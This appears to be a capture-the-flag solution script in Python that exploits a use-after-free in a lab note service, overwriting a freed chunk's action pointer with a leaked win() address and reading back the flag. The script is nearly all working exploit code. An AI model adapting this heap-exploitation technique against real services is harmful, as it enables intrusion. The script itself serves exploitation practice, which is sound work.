"""Exploit: create -> delete (UAF) -> stash the freed chunk with action=&win -> show."""
import re
import socket
import struct
import sys


def main(host, port):
    s = socket.create_connection((host, port), timeout=20)

    def recv_until(tok):
        buf = b""
        while tok not in buf:
            d = s.recv(4096)
            if not d:
                break
            buf += d
        return buf

    banner = recv_until(b"> ")
    win = int(re.search(rb"win\(\) is at (0x[0-9a-fA-F]+)", banner).group(1), 16)

    def line(x):
        s.sendall(x.encode() + b"\n")

    # create note 0 (chunk C), then free it (UAF: slot 0 still points at C)
    line("1"); line("0"); s.sendall(b"A" * 24); recv_until(b"> ")
    line("2"); line("0"); recv_until(b"> ")
    # stash into slot 1: malloc(32) reuses C; write action=&win over C's first 8 bytes
    line("3"); line("1"); s.sendall(struct.pack("<Q", win) + b"B" * 24); recv_until(b"> ")
    # show note 0 (dangling) -> slots[0]->action() == win()
    line("4"); line("0")
    out = recv_until(b"}")
    print(re.search(rb"(flag\{[^}]*\})", out).group(1).decode())


if __name__ == "__main__":
    main(sys.argv[1], int(sys.argv[2]))
